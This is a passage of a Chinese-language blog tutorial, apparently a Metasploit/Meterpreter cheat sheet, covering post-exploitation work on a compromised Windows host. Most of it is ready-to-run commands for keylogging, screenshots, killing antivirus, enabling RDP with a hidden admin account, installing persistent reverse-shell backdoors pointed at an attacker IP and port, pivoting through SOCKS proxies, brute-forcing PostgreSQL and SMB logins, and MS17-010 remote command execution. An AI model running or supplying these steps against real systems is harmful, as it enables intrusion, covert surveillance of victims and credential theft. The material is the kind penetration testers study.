src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100900976.png" alt="image-20220204100900976"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100909036.png" alt="image-20220204100909036"></p><p>这个时候，目标的记事本里就多出了一些内容，就是我们刚刚输入的 hacker_hhhhh</p><p>参考：<a href="https://www.fujieace.com/metasploit/keylogging.html">https://www.fujieace.com/metasploit/keylogging.html</a></p><p><a href="https://blog.csdn.net/nzjdsds/article/details/102767480">https://blog.csdn.net/nzjdsds/article/details/102767480</a></p><h4 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h4><p>screenshot 截屏当前目标桌面情况</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102331316.png" alt="image-20220204102331316"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102352565.png" alt="image-20220204102352565"></p><h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>操作文件系统</p><h5 id="1-文件的基本操作"><a href="#1-文件的基本操作" class="headerlink" title="1.文件的基本操作"></a>1.文件的基本操作</h5><p>　　ls：列出当前路径下的所有文件和文件夹。</p><p>　　pwd 或 getwd：查看当前路径。</p><p>　　search：搜索文件，使用search -h查看帮助。</p><p>　　cat：查看文件内容，比如cat test.txt。</p><p>　　edit：编辑或者创建文件。和Linux系统的vm命令类似，同样适用于目标系统是windows的情况。</p><p>　　rm：删除文件。</p><p>　　cd：切换路径。</p><p>　　mkdir：创建文件夹。</p><p>　　rmdir：删除文件夹。</p><p>　　getlwd 或 lpwd：查看自己系统的当前路径。</p><p>　　lcd：切换自己当前系统的目录。</p><p>　　lls：显示自己当前系统的所有文件和文件夹。</p><p>getwd 查看目标当前目录</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102626093.png" alt="image-20220204102626093"></p><h5 id="2-文件的上传和下载"><a href="#2-文件的上传和下载" class="headerlink" title="2.文件的上传和下载"></a>2.文件的上传和下载</h5><p>　　(1) upload</p><p>　　格式：upload本地文件路径目标文件路径</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102758560.png" alt="image-20220204102758560"></p><p>​        (2)download</p><p>　　格式：download 目标文件路径 本地文件路径</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204102848881.png" alt="image-20220204102848881"></p><h4 id="load扩展"><a href="#load扩展" class="headerlink" title="load扩展"></a>load扩展</h4><p>load 可以加载这些：load -l</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204103406253.png" alt="image-20220204103406253"></p><p>其实还可以加载 python 等等</p><p>load python 加载 python</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204103919212.png" alt="image-20220204103919212"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204103942162.png" alt="image-20220204103942162"></p><p>加载扩展后，我们可以使用基本的Python函数，例如print。这可以通过使用 python_execute命令和标准Python语法来实现。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104001732.png" alt="image-20220204104001732"></p><p>还可以保存到变量，并使用-r开关打印其内容。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104016732.png" alt="image-20220204104016732"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104025351.png" alt="image-20220204104025351"></p><p>运行 python 文件 ： python_import -f /root/liuwx.py</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104055272.png" alt="image-20220204104055272"></p><p>这个好处是，无需对方系统有 python 环境，就可以运行python脚本~ 当然，也可以上传很多扩展，比如 powershell 等等</p><h4 id="系统其它操作"><a href="#系统其它操作" class="headerlink" title="系统其它操作"></a>系统其它操作</h4><h5 id="1-关闭防病毒软件"><a href="#1-关闭防病毒软件" class="headerlink" title="1.关闭防病毒软件"></a>1.关闭防病毒软件</h5><blockquote><p>　　　　run killav</p></blockquote><blockquote><p>　　　　run post/windows/manage/killav</p></blockquote><h5 id="2-操作远程桌面"><a href="#2-操作远程桌面" class="headerlink" title="2.操作远程桌面"></a>2.操作远程桌面</h5><blockquote><p>　　　　run post/windows/manage/enable_rdp开启远程桌面</p></blockquote><blockquote><p>　　　　run post/windows/manage/enable_rdp username=test password=test添加远程桌面的用户(同时也会将该用户添加到管理员组)</p></blockquote><h5 id="3-截屏"><a href="#3-截屏" class="headerlink" title="3.截屏"></a>3.截屏</h5><blockquote><p>　　　　screenshot</p></blockquote><h5 id="4-键盘记录"><a href="#4-键盘记录" class="headerlink" title="4.键盘记录"></a>4.键盘记录</h5><blockquote><p>　　　　keyscan_start：开启键盘记录功能</p></blockquote><blockquote><p>　　　　keyscan_dump：显示捕捉到的键盘记录信息</p></blockquote><blockquote><p>　　　　keyscan_stop：停止键盘记录功能</p></blockquote><h5 id="5-执行程序"><a href="#5-执行程序" class="headerlink" title="5.执行程序"></a>5.执行程序</h5><p>　　execute -h 查看使用方法</p><p>　　-H：创建一个隐藏进程</p><p>　　-a：传递给命令的参数</p><p>　　-i：跟进程进行交互</p><p>　　-m：从内存中执行</p><p>　　-t：使用当前伪造的线程令牌运行进程</p><p>　　-s：在给定会话中执行进程</p><p>　　例：execute -f c:/temp/hello.exe</p><h4 id="端口转发和内网代理"><a href="#端口转发和内网代理" class="headerlink" title="端口转发和内网代理"></a>端口转发和内网代理</h4><h5 id="1-portfwd"><a href="#1-portfwd" class="headerlink" title="1.portfwd"></a>1.portfwd</h5><p>　　portfwd是meterpreter提供的端口转发功能，在meterpreter下使用portfwd -h命令查看该命令的参数。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104213744.png" alt="image-20220204104213744"></p><p>常用参数：</p><p>　　-l：本地监听端口</p><p>　　-r：内网目标的ip</p><p>　　-p：内网目标的端口</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104228660.png" alt="image-20220204104228660"></p><p>上面命令执行之后，会将10.1.1.3的3389端口转发到本地的2222端口。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104240421.png" alt="image-20220204104240421"></p><h5 id="2-pivot"><a href="#2-pivot" class="headerlink" title="2.pivot"></a>2.pivot</h5><p>　　pivot是msf最常用的代理，可以让我们使用msf提供的扫描模块对内网进行探测。</p><p>　 <strong>(1)首先需要在msf的操作界面下添加一个路由表。</strong></p><p>　　添加命令：route add 内网ip 子网掩码  session的id</p><p>　　打印命令：route print</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104308071.png" alt="image-20220204104308071"></p><p>路由添加成功之后就可以在msf里访问10.1.1.0/24这个网段。</p><p>　　<strong>(2)建立socks代理。</strong></p><p>　　如果其它程序需要访问这个内网环境，就可以建立socks代理。</p><p>　　msf提供了3个模块用来做socks代理。</p><blockquote><p>　　　　auxiliary/server/socks4a  </p></blockquote><blockquote><p>　　　　use auxiliary/server/socks5  </p></blockquote><blockquote><p>　　　　use auxiliary/server/socks_unc</p></blockquote><p>　　以auxiliary/server/socks4a为例，查看需要设置的参数。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104324472.png" alt="image-20220204104324472"></p><p>一共两个参数：</p><p>　　SRVHOST：监听的ip地址，默认为0.0.0.0，一般不需要更改。</p><p>　　SRVPORT：监听的端口，默认为1080。</p><p>　　直接运行run命令，就可以成功创建一个socks4代理隧道，在linux上可以配置proxychains使用，在windows可以配置Proxifier进行使用。</p><h4 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h4><p>　　Meterpreter的shell运行在内存中，目标重启就会失效，如果管理员给系统打上补丁，那么就没办法再次使用exploit获取权限，所以需要持久的后门对目标进行控制。</p><p>　　Msf提供了两种后门，一种是metsvc(通过服务启动)，一种是persistence(支持多种方式启动)。</p><h5 id="1-metsvc"><a href="#1-metsvc" class="headerlink" title="1.metsvc"></a>1.metsvc</h5><p>　　<strong>(1) 使用run metsvc -h查看帮助，一共有三个参数。</strong></p><p>　　-A：安装后门后，自动启动exploit/multi/handler模块连接后门</p><p>　　-h：查看帮助</p><p>　　-r：删除后门</p><p>　　<strong>(2) 安装后门</strong></p><p>　　命令：run metsvc</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104337643.png" alt="image-20220204104337643"></p><p>命令运行成功后会在C:WindowsTEMP目录下新建随机名称的文件夹，里面生成3个文件（metsvc.dll、metsvc-server.exe、metsvc.exe）。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104354252.png" alt="image-20220204104354252"></p><p>同时会新建一个服务，显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”,绑定在31337端口。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104405910.png" alt="image-20220204104405910"></p><p><strong>(3) 连接后门</strong></p><p>　　使用exploit/multi/handler模块，payload设置为windows/metsvc_bind_tcp，设置目标ip和绑定端口31337。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104420343.png" alt="image-20220204104420343"></p><h5 id="2-persistence"><a href="#2-persistence" class="headerlink" title="2.persistence"></a>2.persistence</h5><p>　　<strong>(1) 使用run persistence -h查看参数。</strong></p><p>　　-A：安装后门后，自动启动exploit/multi/handler模块连接后门</p><p>　　-L：自启动脚本的路径，默认为%TEMP%</p><p>　　-P：需要使用的payload，默认为windows/meterpreter/reverse_tcp</p><p>　　-S：作为一个服务在系统启动时运行（需要SYSTEM权限）</p><p>　　-T：要使用的备用可执行模板</p><p>　　-U：用户登陆时运行</p><p>　　-X：系统启动时运行</p><p>　　-i：后门每隔多少秒尝试连接服务端</p><p>　　-p：服务端监听的端口</p><p>　　-r：服务端ip</p><p>　　<strong>(2) 生成后门</strong></p><p>　　命令：run persistence -X -i 10 -r 192.168.1.9 -p 4444</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104435254.png" alt="image-20220204104435254"></p><p><strong>(3) 连接后门</strong></p><p>　　使用exploit/multi/handler模块，payload设置为windows/meterpreter/reverse_tcp，同时设置好服务端监听ip和端口。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204104451775.png" alt="image-20220204104451775"></p><p>参考：<a href="https://www.cnblogs.com/diligenceday/p/11028462.html">https://www.cnblogs.com/diligenceday/p/11028462.html</a></p><h3 id="十二、msf之内网渗透之添加路由"><a href="#十二、msf之内网渗透之添加路由" class="headerlink" title="十二、msf之内网渗透之添加路由"></a>十二、msf之内网渗透之添加路由</h3><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204105922367.png" alt="image-20220204105922367"></p><h4 id="获取网段"><a href="#获取网段" class="headerlink" title="获取网段"></a>获取网段</h4><blockquote><p>run get_local_subnets </p></blockquote><blockquote><p>route list</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204105952351.png" alt="image-20220204105952351"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110002010.png" alt="image-20220204110002010"></p><h4 id="添加路由表"><a href="#添加路由表" class="headerlink" title="添加路由表"></a>添加路由表</h4><p>为什么要添加路由表？ 因为添加了路由表，就可以对目标内网进行一些深入渗透 </p><p>添加路由： run autoroute</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110532992.png" alt="image-20220204110532992"></p><p>添加路由表 route add 192.168.0.0 255.255.255.0 1</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110558090.png" alt="image-20220204110558090"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110609632.png" alt="image-20220204110609632"></p><p>还有一种添加方式是： route add 192.168.0.0/24 1</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110712530.png" alt="image-20220204110712530"></p><p>添加路由表 run autoroute -h</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204110902191.png" alt="image-20220204110902191"></p><h3 id="十三、msf之连接数据库-postgresql"><a href="#十三、msf之连接数据库-postgresql" class="headerlink" title="十三、msf之连接数据库_postgresql"></a>十三、msf之连接数据库_postgresql</h3><h4 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h4><p>为什么要使用 postgresql ？ 首先， 连接数据库之后搜索 msf 中模块的速度可以大大提高； 其次， 连接数据库之后，使用 msf 的痕迹会被保存下来，方便之后导出编写 渗透测试报告。 所以， 连接psql数据库不是必须的操作，但是为了提高渗透测试的效率，方便 日后的写报告，还是应该连接数据库，创建缓存。</p><blockquote><p>安装 postgresql ： apt-get install postgresql -y</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113418778.png" alt="image-20220204113418778"></p><h4 id="配置postgresql"><a href="#配置postgresql" class="headerlink" title="配置postgresql"></a>配置postgresql</h4><p>修改 posgres 系统用户密码 </p><p>echo “postgres:hacker123456!” | chpasswd </p><p>修改 postgresql 数据库中默认用户 postgres的密码 </p><p>su postgres 进入 postgres </p><p>psql 连接 psql </p><p>/password postgres 修改密码 hacker123456+ </p><p>/q 退出 </p><p>exit 返回</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113440959.png" alt="image-20220204113440959"></p><h4 id="快捷连接"><a href="#快捷连接" class="headerlink" title="快捷连接"></a>快捷连接</h4><p>查看当前数据库连接状态 ： db_status</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113527755.png" alt="image-20220204113527755"></p><p>使用 msfconsole 的资源加载功能。 </p><ol><li>把 db_connect postgres:<a href="mailto:&#104;&#x61;&#99;&#107;&#101;&#114;&#49;&#x32;&#51;&#x34;&#53;&#x36;&#43;&#64;&#x31;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;">&#104;&#x61;&#99;&#107;&#101;&#114;&#49;&#x32;&#51;&#x34;&#53;&#x36;&#43;&#64;&#x31;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;</a>/msfdb 保存为文件件 connection.rc </li><li>msfconsole -r connection.rc hacker123456+ 是密码</li></ol><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113602545.png" alt="image-20220204113602545"></p><p>已经连接到数据库服务里了</p><h4 id="爆破-postgresql-密码然后保存到数据库"><a href="#爆破-postgresql-密码然后保存到数据库" class="headerlink" title="爆破 postgresql 密码然后保存到数据库"></a>爆破 postgresql 密码然后保存到数据库</h4><p>使用这个模块 ： auxiliary/scanner/postgres/postgres_login </p><p>use auxiliary/scanner/postgres/postgres_login </p><p>set rhosts 127.0.0.1 set username postgres </p><p>set password hacker123456+ 这里密码可以加载一个 txt 文件来爆破 </p><p>设置完数据库名，账号，密码后直接 run</p><p>爆破成功后，数据库就会有记录了：creds</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204113800776.png" alt="image-20220204113800776"></p><h3 id="十四、msf之内网渗透之smb密码爆破-远程命令执行"><a href="#十四、msf之内网渗透之smb密码爆破-远程命令执行" class="headerlink" title="十四、msf之内网渗透之smb密码爆破+远程命令执行"></a>十四、msf之内网渗透之smb密码爆破+远程命令执行</h3><h4 id="爆破SMB"><a href="#爆破SMB" class="headerlink" title="爆破SMB"></a>爆破SMB</h4><p>SMB 对应的端口是 445</p><p>使用的是这个模块 ： auxiliary/scanner/portscan/tcp</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204223548792.png" alt="image-20220204223548792"></p><p>爆破 SMB ，爆破这个 IP 192.168.136.130:445</p><p><strong>use auxiliary/scanner/smb/smb_login</strong></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204224123882.png" alt="image-20220204224123882"></p><p>一般来说 就设置 rhost、用户名、密码，用户名和密码可以在当前工作目录下生成一个 字典文件，然后用 file:/root/dic.txt 指定一个字典文件</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204224141621.png" alt="image-20220204224141621"></p><h4 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h4><p>有了 IP 192.168.1.14 , 账号 admin ， 密码 123456 之后，就可以使用 msf 的模块来 造成远程命令执行：</p><p>使用这个模块 auxiliary/admin/smb/ms17_010_command</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204224856263.png" alt="image-20220204224856263"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204224910613.png" alt="image-20220204224910613"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204230110452.png" alt="image-20220204230110452"></p><h3 id="十五、msf之内网渗透之反向Socks-代理"><a href="#十五、msf之内网渗透之反向Socks-代理" class="headerlink" title="十五、msf之内网渗透之反向Socks 代理"></a>十五、msf之内网渗透之反向Socks 代理</h3><h4 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h4><p>采用 socks 协议的代理服务器就是 socks 服务器，是一种通用的代理服务器，Socks 是个电路级的底层网关。 Socks 代理与应用层、HTTP层代理不同，Socks 代理只是简单的传递数据包，而不必关心是何种应用协议（比如FTP、HTTP和NNTP请求）。 所以，Socks代理比其他应用层代理要快的多。 Socks 不支持 ICMP 、Ping 和 ARP 协议</p><h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>目标内网有多台机器，网速较好，想要便捷访问目标任意服务</p><h4 id="反向Socks代理"><a href="#反向Socks代理" class="headerlink" title="反向Socks代理"></a>反向Socks代理</h4><p>Socks 代理 MSF 有这些模块</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233337071.png" alt="image-20220204233337071"></p><p>我们先使用 1 auxiliary/server/socks4a</p><p>这是需要设置的一些参数：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233402470.png" alt="image-20220204233402470"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233421219.png" alt="image-20220204233421219"></p><p>添加路由： run autoroute -s 192.168.136.130/24 192.168.136.130 是目标的 IP</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233436421.png" alt="image-20220204233436421"></p><h4 id="安装配置-proxychains"><a href="#安装配置-proxychains" class="headerlink" title="安装配置 proxychains"></a>安装配置 proxychains</h4><p><strong>apt-get install proxychains</strong></p><p>配置 proxychains ： /etc/proxychains.conf 在末尾，吧端口更改为刚刚设置监听的 1080 端口</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233530380.png" alt="image-20220204233530380"></p><p>这里的ip  端口 要和前面设置的一样</p><h4 id="使用-proxychains"><a href="#使用-proxychains" class="headerlink" title="使用 proxychains"></a>使用 proxychains</h4><p>proxychains 对 目标机（192.168.136.130） 扫描内网端口 TCP连接扫描 </p><p>proxychains nmap -Pn -sT -P 80,445,1433,3306,3389, 192.168.136.130</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204233616150.png" alt="image-20220204233616150"></p><p>这边扫描出结果，开放了，以上端口，如是开放了 80 端口， 那么就可以直接访问了</p><h3 id="十六、msf之设置session永久不掉线"><a href="#十六、msf之设置session永久不掉线" class="headerlink" title="十六、msf之设置session永久不掉线"></a>十六、msf之设置session永久不掉线</h3><h4 id="保持监听持续"><a href="#保持监听持续" class="headerlink" title="保持监听持续"></a>保持监听持续</h4><p><em># 可以在接收到seesion后继续监听端口，保持侦听。</em> </p><p>msf exploit(multi/handler) &gt; set ExitOnSession false </p><h4 id="防止session超时退出"><a href="#防止session超时退出" class="headerlink" title="防止session超时退出"></a>防止session超时退出</h4><p><em># 默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</em> </p><p>msf5 exploit(multi/handler) &gt; set SessionCommunicationTimeout 0 </p><p><em># 默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</em> </p><p>msf5 exploit(multi/handler) &gt; set SessionExpirationTimeout 0 </p><p>参考：<a href="https://blog.csdn.net/Dearggae/article/details/106614064">https://blog.csdn.net/Dearggae/article/details/106614064</a></p><h3 id="十七、msf之search模块使用"><a href="#十七、msf之search模块使用" class="headerlink" title="十七、msf之search模块使用"></a>十七、msf之search模块使用</h3><p>可以使用内置的关键字系统进一步优化您的搜索。命令：<code>help search</code></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234209811.png" alt="image-20220204234209811"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234229962.png" alt="image-20220204234229962"></p><p>要使用描述性名称进行搜索，请使用name关键字。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234304540.png" alt="image-20220204234304540"></p><p>您可以使用platform将搜索范围缩小到影响特定platform（平台）的模块。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234400441.png" alt="image-20220204234400441"></p><p>使用该type可以按模块类型进行过滤，如auxiliary（辅助），post（提交），exploit（利用）等。</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234504282.png" alt="image-20220204234504282"></p><p>使用author关键字搜索可让您搜索您最喜爱的作者的模块</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204234540021.png" alt="image-20220204234540021"></p><p>当然，<code>search</code>命令还可以在拿到一定权限时，可以在受害者机器内搜索想要的信息</p><p>search -h</p><p>meterpreter &gt; search -h<br>Usage: search [-d dir] [-r recurse] -f pattern<br>Search for files.<br>OPTIONS:<br>-d 开始从中搜索的 目录/驱动器。 留空以搜索所有驱动器。 （默认：）<br>-f 要搜索的文件模式glob。 （例如* secret * .doc？）<br>-h 帮助横幅。<br>-r 递归搜索子目录。 （默认：true）</p><h3 id="十八、msf之常用命令"><a href="#十八、msf之常用命令" class="headerlink" title="十八、msf之常用命令"></a>十八、msf之常用命令</h3><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><p>加载模块 use name </p><p>查看网络配置 ifconfig </p><p>获取进程列表 ps </p><p>查看所有exploit show exploits </p><p>查看所有payload show payloads </p><p>查看所有auxiliary show auxiliary </p><p>展示模块详细信息 info </p><p>查找模块 search name </p><p>查看当前运行的模块 jobs </p><p>重启目标机器 reboot </p><p>关闭目标机器 shutdown </p><p>获取交互shell shell </p><p>当前meterpreter到后台 background </p><p>离开msf quit</p><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>portfwd add -l 6666 -p 3389 -r 192.168.1.2</p><p>常用参数： -l：本地监听端口 -r：内网目标的ip -p：内网目标的端口</p><h4 id="设置Socks代理"><a href="#设置Socks代理" class="headerlink" title="设置Socks代理"></a>设置Socks代理</h4><ul><li>Socks4a代理</li><li>use auxiliary/server/socks4a </li><li>set srvhost 127.0.0.1 </li><li>set srvport 1080 </li><li>run</li></ul><h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><ul><li>获取网段信息 </li><li>run get_local_subnets </li><li>查看帮助 </li><li>run autoroute –h </li><li>添加到目标环境网络 </li><li>run autoroute -s 192.168.0.1/24 </li><li>打印添加的路由 </li><li>run autoroute –p </li><li>删除路由 </li><li>run autoroute -d -s 192.168.0.1/24</li></ul><h4 id="execute执行文件"><a href="#execute执行文件" class="headerlink" title="execute执行文件"></a>execute执行文件</h4><p>在目标机中执行文件</p><p>execute </p><p>创建新进程cmd.exe，-H不可见，-i交互 </p><p>execute -H -i -f cmd.exe</p><p>-f：指定可执行文件 </p><p>-H：创建一个隐藏进程 </p><p>-a：传递给命令的参数 </p><p>-i：跟进程进行交互 </p><p>-m：从内存中执行 </p><p>-t： 使用当前伪造的线程令牌运行进程 </p><p>-s： 在给定会话中执行进程</p><h4 id="migrate转移进程"><a href="#migrate转移进程" 